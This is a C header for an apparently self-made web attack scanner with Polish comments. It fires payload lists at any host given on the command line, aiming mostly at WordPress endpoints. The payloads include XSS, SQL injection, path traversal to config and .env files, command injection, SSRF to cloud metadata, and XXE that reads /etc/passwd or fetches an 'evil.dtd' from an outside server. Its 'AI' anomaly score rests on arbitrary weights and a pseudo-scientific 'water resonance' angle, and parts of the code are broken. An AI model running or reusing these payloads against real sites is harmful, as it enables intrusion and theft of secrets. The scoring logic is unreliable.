#ifndef PRESS_H
#define PRESS_H
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <math.h>
#include <pthread.h>
#include <sys/time.h>
#include <time.h>

#define MAX_BUFFER 8192
#define NUM_THREADS 1 // Liczba wątków roboczych Dżina

// --- ANSI KOLORY DLA KONSOLI ---
#define RESET   "\033[0m"
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define CYAN    "\033[1;36m"
#define MAGENTA "\033[1;35m"
#define BOLD    "\033[1m"

// --- 1. ARCHITEKTURA CHEMIA-AI (EVOLVING H2O) ---
typedef struct {
    unsigned char* matrix_buffer; 
    size_t matrix_size;           
} GenieOcean;

typedef struct {
    float w_hidden[3][4];
    float b_hidden[4];
    float w_output[4];
    float b_output;
    int generation;
} pMicroNeuralNet;

// 1. Atom Tlenu / Model Główny (ONNX-bound)
pMicroNeuralNet ptrained_model = {
    .w_hidden = { { 1.2f, -0.5f,  2.1f,  0.1f },
                  {-0.8f,  1.5f, -0.3f,  0.9f },
                  { 0.4f,  0.2f,  1.1f, -1.2f } },
    .b_hidden = { -0.1f, 0.0f, 0.2f, -0.5f },
    .w_output = { 1.5f, 2.0f, -1.1f, 0.8f },
    .b_output = -0.7f,
    .generation = 1
};

// 2. Czysty Atom Wodoru / Model Reverse (Ewoluujący jon H+)
pMicroNeuralNet reverse_model = {
    .w_hidden = { {-0.5f,  1.2f, -1.1f,  0.4f },
                  { 1.1f, -0.8f,  0.3f, -1.5f },
                  {-0.2f,  0.4f, -1.9f,  0.8f } },
    .b_hidden = {  0.2f, -0.1f, -0.4f,  0.3f },
    .w_output = { -1.1f, 1.8f,  0.9f, -0.5f },
    .b_output =  0.4f,
    .generation = 1
};

// --- SYNCHRONIZACJA WĄTKÓW I RATE-LIMIT ---
pthread_mutex_t task_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t rate_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t print_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t pocean_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t pevo_mutex = PTHREAD_MUTEX_INITIALIZER;

long long next_allowed_time_us = 0; 
int global_task_index = 0;          
unsigned int global_binary_ocean_seed = 1337;

typedef struct {
    const char *host;
    int port;
    const char **paths;
    int num_paths;
    const char **payloads;
    int num_payloads;
    const char **user_agents;
    int num_uas;
    GenieOcean *ocean;
    const char *report_filename;
} ThreadArgs;

// --- ALGORYTM GENETYCZNY: MUTACJA WAG ---
void mutate_micro_nn(pMicroNeuralNet *net, float mutation_intensity) {
    pthread_mutex_lock(&pevo_mutex);
    net->generation++;
    for (int i = 0; i < 3; i++) {
        for (int j = 0; j < 4; j++) {
            net->w_hidden[i][j] += (((float)rand() / (float)RAND_MAX) - 0.5f) * mutation_intensity;
        }
    }
    for (int j = 0; j < 4; j++) {
        net->b_hidden[j] += (((float)rand() / (float)RAND_MAX) - 0.5f) * mutation_intensity;
        net->w_output[j] += (((float)rand() / (float)RAND_MAX) - 0.5f) * mutation_intensity;
    }
    net->b_output += (((float)rand() / (float)RAND_MAX) - 0.5f) * mutation_intensity;
    pthread_mutex_unlock(&pevo_mutex);
}

// --- POMOCNICZE FUNKCJE CZASU I RATE-LIMITU ---
long long get_time_us() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (long long)tv.tv_sec * 1000000LL + tv.tv_usec;
}

void global_rate_limit() {
    pthread_mutex_lock(&rate_mutex);
    long long now = get_time_us();
    if (now < next_allowed_time_us) {
        long long sleep_time = next_allowed_time_us - now;
        pthread_mutex_unlock(&rate_mutex);
        usleep(sleep_time);
        pthread_mutex_lock(&rate_mutex);
        now = get_time_us();
    }
    if (next_allowed_time_us < now) {
        next_allowed_time_us = now + 200000; 
    } else {
        next_allowed_time_us += 200000;
    }
    pthread_mutex_unlock(&rate_mutex);
}

// --- ZARZĄDZANIE OCEANEM W RAM ---
void init_genie_ocean(GenieOcean* ocean, const char* filename) {
    FILE* f = fopen(filename, "rb");
    if (!f) {
        ocean->matrix_size = 4304;
        ocean->matrix_buffer = (unsigned char*)malloc(ocean->matrix_size);
        if (ocean->matrix_buffer) memset(ocean->matrix_buffer, 0xAF, ocean->matrix_size);
        return;
    }
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    ocean->matrix_buffer = (unsigned char*)malloc(size);
    if (!ocean->matrix_buffer) { fclose(f); return; }
    fread(ocean->matrix_buffer, 1, size, f);
    fclose(f);
    ocean->matrix_size = (size_t)size;
    
    if (ocean->matrix_size > 4) {
        unsigned int initial_bytes = *((unsigned int*)ocean->matrix_buffer);
        pthread_mutex_lock(&pocean_mutex);
        global_binary_ocean_seed ^= initial_bytes;
        pthread_mutex_unlock(&pocean_mutex);
    }
}

// --- KLASYCZNY RAPORT HTML DLA INFORMATYKA (PROCENTY) ---
void init_html_report(const char *filename, const char *host) {
    FILE *f = fopen(filename, "w");
    if (!f) return;
    
    fprintf(f, "<!DOCTYPE html>\n<html lang=\"pl\">\n<head>\n");
    fprintf(f, "<meta charset=\"UTF-8\">\n");
    fprintf(f, "<title>Dżin AI - Raport z Audytu Bezpieczeństwa (%s)</title>\n", host);
    fprintf(f, "<style>\n");
    fprintf(f, "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: #f8fafc; margin: 40px; }\n");
    fprintf(f, "h1 { color: #38bdf8; display: flex; align-items: center; gap: 10px; }\n");
    fprintf(f, ".meta { background: #1e293b; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #38bdf8; }\n");
    fprintf(f, "table { width: 100%%; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; }\n");
    fprintf(f, "th, td { padding: 12px 16px; border-bottom: 1px solid #334155; text-align: left; }\n");
    fprintf(f, "th { background: #334155; color: #38bdf8; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; }\n");
    fprintf(f, "tr:hover { background: #273548; }\n");
    fprintf(f, "a { color: #38bdf8; text-decoration: none; }\n");
    fprintf(f, "a:hover { text-decoration: underline; }\n");
    fprintf(f, ".badge-red { background: #dc2626; color: white; padding: 4px 8px; border-radius: 4px; font-weight: bold; font-size: 11px; }\n");
    fprintf(f, ".badge-green { background: #16a34a; color: white; padding: 4px 8px; border-radius: 4px; font-weight: bold; font-size: 11px; }\n");
    fprintf(f, "code { background: #0f172a; padding: 2px 6px; border-radius: 4px; color: #e2e8f0; font-family: monospace; }\n");
    fprintf(f, "</style>\n</head>\n<body>\n");
    fprintf(f, "<h1>🧞 Raport z Audytu Bezpieczeństwa - Dżin AI</h1>\n");
    fprintf(f, "<div class=\"meta\">\n<p>Cel ataku / rekonesansu: <strong>%s</strong></p>\n", host);
    fprintf(f, "<p>Status: Zakończono pomyślnie. Silnik: <em>Micro-NN + Rezonans H2O</em></p>\n</div>\n");
    fprintf(f, "<table>\n<thead>\n<tr>\n");
    fprintf(f, "<th>Testowany URL (Klikalny)</th>\n<th>Kod HTTP</th>\n<th>Odbicie XSS (Body)</th>\n<th>Anomaly Score</th>\n");
    fprintf(f, "</tr>\n</thead>\n<tbody>\n");
    
    fclose(f);
}
void append_html_row(const char *filename, const char *target, int status_code, int is_reflected, float anomaly_score) {
    FILE *f = fopen(filename, "a");
    if (!f) return;
    
    fprintf(f, "<tr>\n");
    fprintf(f, "<td><code>%s</code></td>\n", target);
    fprintf(f, "<td><strong>%d</strong></td>\n", status_code);
    
    if (is_reflected) {
        fprintf(f, "<td><span class=\"badge-red\">TAK (POTENCJALNY XSS)</span></td>\n");
    } else {
        fprintf(f, "<td><span class=\"badge-green\">BRAK</span></td>\n");
    }
    
    fprintf(f, "<td>%.2f%%</td>\n", anomaly_score * 100.0f);
    fprintf(f, "</tr>\n");
    
    fclose(f);
}

void append_html_row(const char *filename, const char *host, const char *full_target, int status_code, int is_reflected, float anomaly_percentage) {
    FILE *f = fopen(filename, "a");
    if (!f) return;
    
    fprintf(f, "<tr>\n");
    fprintf(f, "<td><a href=\"http://%s%s\" target=\"_blank\"><code>%s%s</code></a></td>\n", host, full_target, host, full_target);
    fprintf(f, "<td><strong>%d</strong></td>\n", status_code);
    
    if (is_reflected) {
        fprintf(f, "<td><span class=\"badge-red\">TAK (POTENCJALNY XSS)</span></td>\n");
    } else {
        fprintf(f, "<td><span class=\"badge-green\">BRAK</span></td>\n");
    }
    
    fprintf(f, "<td><strong>%.2f%%</strong></td>\n", anomaly_percentage);
    fprintf(f, "</tr>\n");
    
    fclose(f);
}

void close_html_report(const char *filename) {
    FILE *f = fopen(filename, "a");
    if (!f) return;
    
    fprintf(f, "</tbody>\n</table>\n");
    fprintf(f, "<footer style=\"margin-top: 30px; text-align: center; color: #64748b; font-size: 12px;\">\n");
    fprintf(f, "<p>Wygenerowane automatycznie przez autorski skaner Micro-NN Dżin AI</p>\n");
    fprintf(f, "</footer>\n");
    fprintf(f, "</body>\n</html>\n");
    
    fclose(f);
}

// --- INFERENCJA SIECI NEURONOWEJ ---
float relu(float x) { return x > 0.0f ? x : 0.0f; }
float sigmoid(float x) { return 1.0f / (1.0f + expf(-x)); }

float ai_evaluate_response(int status_code, size_t response_len, int is_reflected, pMicroNeuralNet *model) {
    float inputs[3];
    inputs[0] = (float)status_code / 500.0f;               
    inputs[1] = (float)response_len / 10000.0f;             
    inputs[2] = is_reflected ? 1.0f : 0.0f; 

    float hidden[4];
    for (int j = 0; j < 4; j++) {
        float sum = model->b_hidden[j];
        for (int i = 0; i < 3; i++) {
            sum += inputs[i] * model->w_hidden[i][j];
        }
        hidden[j] = relu(sum);
    }

    float output_sum = model->b_output;
    for (int j = 0; j < 4; j++) {
        output_sum += hidden[j] * model->w_output[j];
    }

    return sigmoid(output_sum);
}

// --- MECHANIZM REZONANSU (104.5°) ---
int check_water_molecule_resonance(float score_main, float score_reverse, float *out_angle) {
    float val = fminf(fmaxf(score_main * score_reverse, -1.0f), 1.0f);
    float angle = acosf(val) * (180.0f / 3.14159f);
    if (out_angle) *out_angle = angle;
    if (angle >= 98.0f && angle <= 111.0f) return 1; 
    return 0;
}

// --- WĄTEK ROBOCZY DŻINA ---
void *worker_routine(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    int total_combinations = args->num_paths * args->num_payloads;

    while (1) {
        pthread_mutex_lock(&task_mutex);
        int current_idx = global_task_index++;
        pthread_mutex_unlock(&task_mutex);

        if (current_idx >= total_combinations) break;

        int p_idx = current_idx / args->num_payloads;
        int l_idx = current_idx % args->num_payloads;

        const char *path = args->paths[p_idx];
        const char *payload = args->payloads[l_idx];

        pthread_mutex_lock(&pocean_mutex);
        unsigned int current_seed = global_binary_ocean_seed;
        global_binary_ocean_seed = (global_binary_ocean_seed >> 1) ^ (global_binary_ocean_seed << 3);
        
        if (args->ocean->matrix_buffer && args->ocean->matrix_size > 0) {
            unsigned char b = args->ocean->matrix_buffer[current_idx % args->ocean->matrix_size];
            global_binary_ocean_seed ^= b;
        }
        pthread_mutex_unlock(&pocean_mutex);

        const char *selected_ua = args->user_agents[current_seed % args->num_uas];
        global_rate_limit();

        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;

        struct hostent *server = gethostbyname(args->host);
        if (!server) { close(sockfd); continue; }

        struct sockaddr_in serv_addr;
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
        serv_addr.sin_port = htons(args->port);

        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            close(sockfd);
            continue;
        }

        char full_target[1024];
        char request[4096];
        char buffer[MAX_BUFFER];

        int is_delete = (strstr(payload, "delete") != NULL ||
                         strstr(payload, "DELETE") != NULL ||
                         strstr(payload, "_method=DELETE") != NULL);
        int is_put = (!is_delete &&
                      (strstr(payload, "put") != NULL ||
                       strstr(payload, "PUT") != NULL ||
                       strstr(payload, "_method=PUT") != NULL ||
                       strstr(payload, "aktualizacja") != NULL));
        int is_post = (!is_delete && !is_put &&
                       (strstr(payload, "<form") != NULL || 
                        strstr(payload, "<?xml") != NULL || 
                        strstr(payload, "methodCall") != NULL ||
                        strstr(path, "xmlrpc.php") != NULL ||
                        strstr(path, "wp-comments-post.php") != NULL));

        const char *method_name = is_delete ? "DELETE" : (is_put ? "PUT" : (is_post ? "POST" : "GET"));

        if (is_delete) {
            if (strchr(path, '?') != NULL) {
                snprintf(full_target, sizeof(full_target), "%s&%s", path, payload);
            } else {
                snprintf(full_target, sizeof(full_target), "%s%s", path, payload);
            }

            snprintf(request, sizeof(request),
                     "DELETE %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Connection: close\r\n\r\n",
                     full_target, args->host, selected_ua);
        } else if (is_put) {
            snprintf(full_target, sizeof(full_target), "%s%s", path,payload);
            char put_body[2048];
            snprintf(put_body, sizeof(put_body), "%s", payload);

            int content_length = strlen(put_body);
            const char *content_type = (put_body[0] == '{')
                                       ? "application/json" : "application/x-www-form-urlencoded";

            snprintf(request, sizeof(request),
                     "PUT %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Content-Type: %s\r\n"
                     "Content-Length: %d\r\n"
                     "Connection: close\r\n\r\n"
                     "%s",
                     full_target, args->host, selected_ua, content_type, content_length, put_body);
        } else if (is_post) {
            snprintf(full_target, sizeof(full_target), "%s%s", path,payload);
            char post_body[2048];
            if (strstr(payload, "<?xml") != NULL || strstr(payload, "methodCall") != NULL) {
                snprintf(post_body, sizeof(post_body), "%s%s",path, payload);
            } else if (strstr(payload, "<form") != NULL) {
                snprintf(post_body, sizeof(post_body), "payload=%s", payload);
            } else {
                snprintf(post_body, sizeof(post_body), "%s", payload);
            }

            int content_length = strlen(post_body);
            const char *content_type = (strstr(payload, "<?xml") != NULL || strstr(payload, "methodCall") != NULL) 
                                       ? "text/xml" : "application/x-www-form-urlencoded";

            snprintf(request, sizeof(request),
                     "POST %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Content-Length: %d\r\n"
                     "Connection: close\r\n\r\n"
                     "%s",
                     full_target, args->host, selected_ua,  content_length, post_body);
        } else {
            if (strchr(path, '?') != NULL) {
                snprintf(full_target, sizeof(full_target), "%s%s", path, payload);
            } else {
                snprintf(full_target, sizeof(full_target), "%s%s", path, payload);
            }

            snprintf(request, sizeof(request), 
                     "GET %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                     "Connection: close\r\n\r\n", 
                     full_target, args->host, selected_ua);
        }

        write(sockfd, request, strlen(request));

        memset(buffer, 0, sizeof(buffer));
        ssize_t bytes_received = read(sockfd, buffer, sizeof(buffer) - 1);
        close(sockfd);

        if (bytes_received > 0) {
            int status_code = 0;
            sscanf(buffer, "HTTP/1.1 %d", &status_code);
            if (status_code == 0) sscanf(buffer, "HTTP/1.0 %d", &status_code);

            int is_reflected = 0;
            char *body = strstr(buffer, "\r\n\r\n");
            if (body != NULL) {
                body += 4;
                if (strstr(body, payload) != NULL) {
                    is_reflected = 1;
                }
            }

            // Ewaluacja sieci
            float score_oxygen = ai_evaluate_response(status_code, (size_t)bytes_received, is_reflected, &ptrained_model);
            float score_hydrogen = ai_evaluate_response(status_code, (size_t)bytes_received, is_reflected, &reverse_model);

            float resonance_angle = 0.0f;
            int is_snow_crystal = check_water_molecule_resonance(score_oxygen, score_hydrogen, &resonance_angle);

            // Obliczenie finalnego wskaźnika anomalii w procentach dla informatyków
            float anomaly_percentage = ((score_oxygen + score_hydrogen) / 2.0f) * 100.0f;

            // Mutacja genetyczna jeśli wykryto rezonans (płatek śniegu rośnie w tle)
            if (is_snow_crystal) {
                mutate_micro_nn(&reverse_model, 0.03f);
            }

            const char *status_color = (status_code == 200) ? GREEN : (status_code >= 400 ? RED : YELLOW);
            const char *anomaly_color = (anomaly_percentage > 20.0f) ? GREEN : CYAN;

            pthread_mutex_lock(&print_mutex);
            printf("[%s | https://%s%s] -> HTTP %s%d" RESET " | Odbicie: %s | Anomaly: %s%.2f%%" RESET "\n", 
                   method_name,
                   args->host, full_target, status_color, status_code, 
                   is_reflected ? RED "TAK 🚨" RESET : GREEN "BRAK" RESET, 
                   anomaly_color, anomaly_percentage);
            pthread_mutex_unlock(&print_mutex);

            pthread_mutex_lock(&file_mutex);
              
                
            append_html_row(args->report_filename, args->host, full_target, status_code, is_reflected, anomaly_percentage);
            
            if (anomaly_percentage > 60.0f || is_reflected || is_snow_crystal) {
                FILE *f = fopen("anomalies.log", "a");
                if (f) {
                    fprintf(f, "=== ANOMALIA / SNOWFLAKE ===\nMethod: %s\nTarget: %s%s\nStatus: %d\nScore: %.2f%%\n\n", 
                            method_name, args->host, full_target, status_code, anomaly_percentage);
                    fclose(f);
                }
            }
            pthread_mutex_unlock(&file_mutex);
        }
    }
    return NULL;
}

int press(int argc, char *argv[]) {
    srand(time(NULL));

    if (argc < 2) {
        printf("Użycie: %s <host> [port]\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    int port = (argc > 2) ? atoi(argv[2]) : 80;
    const char *report_file = "report.html"; // Stara nazwa raportu dla informatyków

    GenieOcean ocean;
    init_genie_ocean(&ocean, "network_anomaly.onnx");

    init_html_report(report_file, host);

    const char *paths[] = {
        "/",
        "/robots.txt",
        "/sitemap.xml",
        "/cdn-cgi/",
        "/xmlrpc.php <form action=xmlrpc.php' method='POST'> <input type='text' name='tytul' value='<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><methodCall><methodName>system.listMethods</methodName><params><param><value><string>&xxe;</string></value></param></params></methodCall>'/> <button type='submit'>Wyślij</button></form>",
        "/xmlrpc.php",
        "/../../wp-config.php"
        "/wp-login.php",         // Strona logowania
        "/wp-comments-post.php", // Endpoint komentarzy (POST)
        "/wp-admin/post.php",    // Panel postów
        "/wp-admin/admin-ajax.php",
        "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/posts<form method='post' action='demo_request.php'> Name: <input type='text' name='fname'> <input type='submit'></form>",  // REST API - Posty
        "/wp-json/wp/v2/users",  // REST API - Enumeracja użytkowników
        "/?author=1",            // Klasyczna enumeracja autora w WP
        "/wp-content/",
        "/wp-includes/",
        "/.env",
        "/wp-config.php"
    };
const char *payloads[] = {
        "?debug=true",
        "?admin=1",
        "?file=../../passwd",
        "<form action='wp-comments-post.php' method='POST'> <input type='text' name='tytul' value='coment'/> <button type='submit'>Wyślij</button></form>",
        "?q=<script>alert(1)</script>",
        "?q=<b>help</b>",
         "<form action='post.php' method='POST'> <input type='text' name='tytul' value='post.php'/> <button type='submit'>Wyślij</button></form>",
        "?q=<input type='text' id='lname' name='lname' value='Doe'><br><br><input type='submit'>",      
        "?file=../../config.php",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"wget http://serwerc.prv.pl:80/evil.dtd\">%xxe;]><root>test</root>",
"?file=../../wp-config.php",
        "?file=../../settings.py",
        "?id=1' OR '1'='1",
        "?file=../../.env",
        "?id=1 UNION SELECT NULL,NULL,NULL--",
        "?feed=http://localhost/internal-admin",
        ":http://serwerc.prv.pl/",
        "?search=test' AND 1=CONVERT(int, @@version)--",
        "?url=http://169.254.169.254/latest/meta-data/",       
     "exec=cat+/etc/passwd&url=https://serwerc.prv.pl/",
        "?ping=127.0.0.1%3B+whoami",
        "?exec=cat+/etc/passwd",
        "<!DOCTYPE html><html lang=\"pl\"><head><meta charset=\"UTF-8\"><title>Upload</title></head><body><form id=\"f\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" id=\"p\" required></form><script>window.addEventListener('keydown', e => {if (e.key === 'Enter') e.preventDefault();if (e.key === 'ArrowRight') {e.preventDefault();if (document.getElementById('p').files.length) document.getElementById('f').submit();}});</script></body></html>",
        "?q=<input type='button' onclick='alert('Hello World!')' value='Click Me!'>",
        "?q=<form method='POST'><form action='/action_page.php'><input type='file' id='myfile' name='myfile'><br><br><input type='submit' value='Submit'></from>",

    // --- PAYLOADY XXE ---
    "?q=<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",

    // --- PAYLOADY PUT ---
    "{\"put\":\"aktualizacja\",\"status\":\"draft\"}",
    "_method=PUT&tytul=aktualizacja",

    // --- PAYLOADY DELETE ---
    "?delete=1",
    "_method=DELETE&id=1"
    };

    const char *user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/123.0",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><agent>&xxe;</agent>"
    };

    ThreadArgs args = {
        .host = host,
        .port = port,
        .paths = paths,
        .num_paths = sizeof(paths) / sizeof(paths[0]),
        .payloads = payloads,
        .num_payloads = sizeof(payloads) / sizeof(payloads[0]),
        .user_agents = user_agents,
        .num_uas = sizeof(user_agents) / sizeof(user_agents[0]),
        .ocean = &ocean,
        .report_filename = report_file
    };

    int total_tests = args.num_paths * args.num_payloads;
    printf(GREEN "🧞 [Dżin]: Start audytu (Testów: %d, Wątki: %d)...\n\n" RESET, 
           total_tests, NUM_THREADS);

    pthread_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_create(&threads[i], NULL, worker_routine, &args);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    close_html_report(report_file);
    if (ocean.matrix_buffer) free(ocean.matrix_buffer);

    printf(GREEN "\n🌙 Audyt zakończony! Sprawdź pliki:\n" RESET);
    printf("📄 Raport graficzny: '%s' (z tradycyjnym Anomaly Score %%)\n", report_file);
    printf("📝 Logi tekstowe: 'anomalies.log'\n");
    return 0;
}
#endif